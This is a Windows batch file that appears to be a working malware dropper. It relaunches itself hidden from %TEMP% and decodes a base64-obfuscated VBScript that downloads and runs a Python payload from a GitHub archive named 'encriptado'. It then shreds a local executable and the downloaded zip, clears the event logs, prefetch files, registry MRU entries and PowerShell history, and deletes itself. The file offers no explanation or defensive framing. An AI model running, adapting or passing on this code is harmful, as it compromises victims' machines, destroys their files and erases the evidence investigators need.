@echo off
setlocal enabledelayedexpansion

if not "%1"=="worker" (
    set "tempbat=%TEMP%\~w!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!tempbat!" >nul 2>&1
    if exist "!tempbat!" (
        start /b cmd /c call "!tempbat!" worker
        timeout /t 2 /nobreak >nul
        del /f /q "%~f0" >nul 2>&1
    )
    exit /b
)

set "vbsfile=%TEMP%\~init!RANDOM!.vbs"

powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"$b64 = 'T24gRXJyb3IgUmVzdW1lIE5leHQKUmFuZG9taXplClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKCnNjcmlwdFBhdGggPSBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lCnNjcmlwdE5hbWUgPSBmc28uR2V0RmlsZU5hbWUoc2NyaXB0UGF0aCkKc2NyaXB0RGlyID0gZnNvLkdldFBhcmVudEZvbGRlck5hbWUoc2NyaXB0UGF0aCkKdGVtcEJhc2UgPSBzaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVURU1QJSIpCgpJZiBJblN0cihMQ2FzZShzY3JpcHRQYXRoKSwgTENhc2UodGVtcEJhc2UpKSA+IDAgQW5kIExDYXNlKHNjcmlwdE5hbWUpID0gImNvcmUudmJzIiBUaGVuCiAgICBleGVQYXRoID0gIiIKICAgIEZvciBFYWNoIGYgSW4gZnNvLkdldEZvbGRlcihzY3JpcHREaXIpLkZpbGVzCiAgICAgICAgSWYgTENhc2UoUmlnaHQoZi5OYW1lLCA0KSkgPSAiLmV4ZSIgVGhlbgogICAgICAgICAgICBleGVQYXRoID0gZi5QYXRoCiAgICAgICAgICAgIEV4aXQgRm9yCiAgICAgICAgRW5kIElmCiAgICBOZXh0CiAgICAKICAgIHJlcG9VUkwgPSAiaHR0cHM6Ly9naXRodWIuY29tL2JyYXlhbmpob2FuY2UyLWNvbGxhYi9lbmNyaXB0YWRvL2FyY2hpdmUvcmVmcy9oZWFkcy9tYWluLnppcCIKICAgIHppcFBhdGggPSBzY3JpcHREaXIgJiAiXHJlcG8uemlwIgogICAgZXh0cmFjdFBhdGggPSBzY3JpcHREaXIgJiAiXGV4dHJhY3RlZCIKICAgIAogICAgcHNEb3dubG9hZCA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Ob1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiIiICYgXwogICAgIltOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgPSBbTmV0LlNlY3VyaXR5UHJvdG9jb2xUeXBlXTo6VGxzMTI7ICIgJiBfCiAgICAiJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KICAgICJ0cnkgeyAiICYgXwogICAgIiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICciICYgcmVwb1VSTCAmICInIC1PdXRGaWxlICciICYgemlwUGF0aCAmICInIC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgMTIwOyAiICYgXwogICAgIiAgICBFeHBhbmQtQXJjaGl2ZSAtUGF0aCAnIiAmIHppcFBhdGggJiAiJyAtRGVzdGluYXRpb25QYXRoICciICYgZXh0cmFjdFBhdGggJiAiJyAtRm9yY2UgIiAmIF8KICAgICJ9IGNhdGNoIHsgZXhpdCAxIH0gIiAmIF8KICAgICIiIiIKICAgIAogICAgc2hlbGwuUnVuIHBzRG93bmxvYWQsIDAsIFRydWUKICAgIFdTY3JpcHQuU2xlZXAgODAwMAogICAgCiAgICBJZiBOb3QgZnNvLkZpbGVFeGlzdHMoemlwUGF0aCkgVGhlbgogICAgICAgIFdTY3JpcHQuUXVpdAogICAgRW5kIElmCiAgICAKICAgIFdTY3JpcHQuU2xlZXAgMjAwMAogICAgCiAgICByZXBvUGF0aCA9ICIiCiAgICBsYXVuY2hlclBhdGggPSAiIgogICAgcHl0aG9uUGF0aCA9ICIiCiAgICAKICAgIElmIGZzby5Gb2xkZXJFeGlzdHMoZXh0cmFjdFBhdGgpIFRoZW4KICAgICAgICBGb3IgRWFjaCBzdWJmb2xkZXIgSW4gZnNvLkdldEZvbGRlcihleHRyYWN0UGF0aCkuU3ViRm9sZGVycwogICAgICAgICAgICBJZiBMQ2FzZShzdWJmb2xkZXIuTmFtZSkgPSAiZW5jcmlwdGFkby1tYWluIiBUaGVuCiAgICAgICAgICAgICAgICByZXBvUGF0aCA9IHN1YmZvbGRlci5QYXRoCiAgICAgICAgICAgICAgICBsYXVuY2hlclBhdGggPSByZXBvUGF0aCAmICJcbGF1bmNoZXIucHkiCiAgICAgICAgICAgICAgICBweXRob25QYXRoID0gcmVwb1BhdGggJiAiXHB5dGhvbl9wb3J0YWJsZVxweXRob24uZXhlIgogICAgICAgICAgICAgICAgRXhpdCBGb3IKICAgICAgICAgICAgRW5kIElmCiAgICAgICAgTmV4dAogICAgRW5kIElmCiAgICAKICAgIElmIHJlcG9QYXRoIDw+ICIiIEFuZCBmc28uRmlsZUV4aXN0cyhsYXVuY2hlclBhdGgpIEFuZCBmc28uRmlsZUV4aXN0cyhweXRob25QYXRoKSBUaGVuCiAgICAgICAgc2hlbGwuQ3VycmVudERpcmVjdG9yeSA9IHJlcG9QYXRoCiAgICAgICAgY21kTGF1bmNoID0gIiIiIiAmIHB5dGhvblBhdGggJiAiIiIgIiIiICYgbGF1bmNoZXJQYXRoICYgIiIiIgogICAgICAgIHNoZWxsLlJ1biBjbWRMYXVuY2gsIDAsIEZhbHNlCiAgICAgICAgV1NjcmlwdC5TbGVlcCAxMDAwMAogICAgRW5kIElmCiAgICAKICAgIElmIGV4ZVBhdGggPD4gIiIgQW5kIGZzby5GaWxlRXhpc3RzKGV4ZVBhdGgpIFRoZW4KICAgICAgICBGb3IgaSA9IDEgVG8gMwogICAgICAgICAgICBTZXQgZncgPSBmc28uT3BlblRleHRGaWxlKGV4ZVBhdGgsIDIpCiAgICAgICAgICAgIEZvciBqID0gMSBUbyAxMDAwCiAgICAgICAgICAgICAgICBmdy5Xcml0ZUxpbmUgU3RyaW5nKDgwLCBDaHIoSW50KFJuZCAqIDI2KSArIDY1KSkKICAgICAgICAgICAgTmV4dAogICAgICAgICAgICBmdy5DbG9zZQogICAgICAgICAgICBXU2NyaXB0LlNsZWVwIDIwMAogICAgICAgIE5leHQKICAgICAgICBmc28uRGVsZXRlRmlsZSBleGVQYXRoLCBUcnVlCiAgICBFbmQgSWYKICAgIAogICAgV1NjcmlwdC5TbGVlcCAyMDAwCiAgICAKICAgIElmIGZzby5GaWxlRXhpc3RzKHppcFBhdGgpIFRoZW4KICAgICAgICB6aXBTaXplID0gZnNvLkdldEZpbGUoemlwUGF0aCkuU2l6ZQogICAgICAgIElmIHppcFNpemUgPiAwIEFuZCB6aXBTaXplIDwgMTAwMDAwMDAwIFRoZW4KICAgICAgICAgICAgRm9yIHBhc3MgPSAxIFRvIDMKICAgICAgICAgICAgICAgIHBzU2hyZWQgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCAiIiIgJiBfCiAgICAgICAgICAgICAgICAiJGJ5dGVzID0gTmV3LU9iamVjdCBieXRlW10gIiAmIHppcFNpemUgJiAiOyAiICYgXwogICAgICAgICAgICAgICAgIihOZXctT2JqZWN0IFJhbmRvbSkuTmV4dEJ5dGVzKCRieXRlcyk7ICIgJiBfCiAgICAgICAgICAgICAgICAiW0lPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCciICYgemlwUGF0aCAmICInLCAkYnl0ZXMpICIgJiBfCiAgICAgICAgICAgICAgICAiIiIiCiAgICAgICAgICAgICAgICBzaGVsbC5SdW4gcHNTaHJlZCwgMCwgVHJ1ZQogICAgICAgICAgICAgICAgV1NjcmlwdC5TbGVlcCA1MDAKICAgICAgICAgICAgTmV4dAogICAgICAgIEVuZCBJZgogICAgICAgIGZzby5EZWxldGVGaWxlIHppcFBhdGgsIFRydWUKICAgIEVuZCBJZgogICAgCiAgICBwc0NsZWFyID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiIiIgJiBfCiAgICAiJEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZSc7IiAmIF8KICAgICJHZXQtQ2hpbGRJdGVtICckZW52OlVTRVJQUk9GSUxFXEFwcERhdGFcTG9jYWxcTWljcm9zb2Z0XFdpbmRvd3NcRXhwbG9yZXInIC1GaWx0ZXIgJyouZGInfFJlbW92ZS1JdGVtIC1Gb3JjZTsiICYgXwogICAgIkdldC1DaGlsZEl0ZW0gJyRlbnY6TE9DQUxBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXEFwcENvbXBhdFxQcm9ncmFtcycgLUZpbHRlciAnQW1jYWNoZSouaGl2ZSd8UmVtb3ZlLUl0ZW0gLUZvcmNlOyIgJiBfCiAgICAiR2V0LUNoaWxkSXRlbSAnJGVudjpMT0NBTEFQUERBVEFXNTY3Jvc29mdFxXaW5kb3dzXENvcmVBcHBsaWNhdGlvbkRhdGEnIC1SZWN1cnNlIC1GaWx0ZXIgJyouZGInfFJlbW92ZS1JdGVtIC1Gb3JjZTsiICYgXwogICAgIlJlbW92ZS1JdGVtICckZW52OlVTRVJQUk9GSUxFXEFwcERhdGFcTG9jYWxcTWljcm9zb2Z0XFdpbmRvd3NcRmlsZUhpc3RvcnknIC1SZWN1cnNlIC1Gb3JjZTsiICYgXwogICAgIkdldC1DaGlsZEl0ZW0gJyRlbnY6VVNFUlBST0ZJTEVcQXBwRGF0YVxSb2FtaW5nXE1pY3Jvc29mdFxXaW5kb3dzXFJlY2VudCcgLUZpbHRlciAnKi5sbmsnfFJlbW92ZS1JdGVtIC1Gb3JjZTsiICYgXwogICAgIlJlbW92ZS1JdGVtUHJvcGVydHkgLVBhdGggJ0hLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXFJ1bk1SVScgLU5hbWUgJyonIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlOyIgJiBfCiAgICAiUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcQ29tRGxnMzInIC1OYW1lICdPcGVuU2F2ZVBpZGxNUlUnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlOyIgJiBfCiAgICAiUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcQ29tRGxnMzInIC1OYW1lICdMYXN0VmlzaXRlZFBpZGxNUlUnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlOyIgJiBfCiAgICAiUmVtb3ZlLUl0ZW0gJ0M6XFdpbmRvd3NcUHJlZmV0Y2hcKi5wZicgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlOyIgJiBfCiAgICAiQ2xlYXItUmVjeWNsZUJpbiAtRm9yY2UgLUNvbmZpcm06JGZhbHNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlOyIgJiBfCiAgICAid2V2dHV0aWwgY2wgQXBwbGljYXRpb24gMj4kbnVsbDt3ZXZ0dXRpbCBjbCBTeXN0ZW0gMj4kbnVsbDsiICYgXwogICAgIlJlbW92ZS1JdGVtICckZW52OkFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcUG93ZXJTaGVsbFxQU1JlYWRMaW5lXENvbnNvbGVIb3N0X2hpc3RvcnkudHh0JyAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUiICYgXwogICAgIiIiIgogICAgc2hlbGwuUnVuIHBzQ2xlYXIsIDAsIFRydWUKICAgIAogICAgV1NjcmlwdC5TbGVlcCAyMDAwCiAgICBjbGVhbnVwQmF0ID0gc2NyaXB0RGlyICYgIlxjbGVhbnVwLmJhdCIKICAgIFNldCBmYyA9IGZzby5DcmVhdGVUZXh0RmlsZShjbGVhbnVwQmF0LCBUcnVlKQogICAgZmMuV3JpdGVMaW5lICJAZWNobyBvZmYiCiAgICBmYy5Xcml0ZUxpbmUgInRpbWVvdXQgL3QgOCAvbm9icmVhayA+bnVsIgogICAgZmMuV3JpdGVMaW5lICJ0YXNra2lsbCAvZiAvaW0gd3NjcmlwdC5leGUgPm51bCAyPiYxIgogICAgZmMuV3JpdGVMaW5lICJkZWwgL2YgL3EgIiIiICYgc2NyaXB0UGF0aCAmICIiIiA+bnVsIDI+JjEiCiAgICBmYy5Xcml0ZUxpbmUgImNkIC9kICVURU1QJSIKICAgIGZjLldyaXRlTGluZSAicm1kaXIgL3MgL3EgIiIiICYgc2NyaXB0RGlyICYgIiIiID5udWwgMj4mMSIKICAgIGZjLldyaXRlTGluZSAiKGdvdG8pIDI+bnVsICYgZGVsIC9mIC9xICIiJX4wIiIgJiBleGl0IgogICAgZmMuQ2xvc2UKICAgIAogICAgc2hlbGwuUnVuICJjbWQuZXhlIC9jICIiIiAmIGNsZWFudXBCYXQgJiAiIiIiLCAwLCBGYWxzZQogICAgV1NjcmlwdC5RdWl0CiAgICAKRWxzZQogICAgdGVtcElEID0gInN5c18iICYgSW50KFJuZCAqIDk5OTk5OSArIDEwMDAwMCkKICAgIHRlbXBXb3JrID0gdGVtcEJhc2UgJiAiXCIgJiB0ZW1wSUQKICAgIGZzby5DcmVhdGVGb2xkZXIgdGVtcFdvcmsKICAgIAogICAgdmJzVGVtcCA9IHRlbXBXb3JrICYgIlxjb3JlLnZicyIKICAgIGZzby5Db3B5RmlsZSBzY3JpcHRQYXRoLCB2YnNUZW1wLCBUcnVlCiAgICAKICAgIHNoZWxsLlJ1biAid3NjcmlwdC5leGUgIiIiICYgdmJzVGVtcCAmICIiIiAvL0IgLy9Ob2xvZ28iLCAwLCBGYWxzZQogICAgV1NjcmlwdC5TbGVlcCAxMDAwCiAgICAKICAgIGZzby5EZWxldGVGaWxlIHNjcmlwdFBhdGgsIFRydWUKICAgIFdTY3JpcHQuUXVpdAogICAgCkVuZCBJZg=='; ^
$bytes = [Convert]::FromBase64String($b64); ^
[IO.File]::WriteAllBytes('%vbsfile%', $bytes)"

timeout /t 2 /nobreak >nul

if exist "%vbsfile%" (
    start /b wscript.exe "%vbsfile%" //B //Nologo
    timeout /t 3 /nobreak >nul
)

del /f /q "%~f0" >nul 2>&1
exit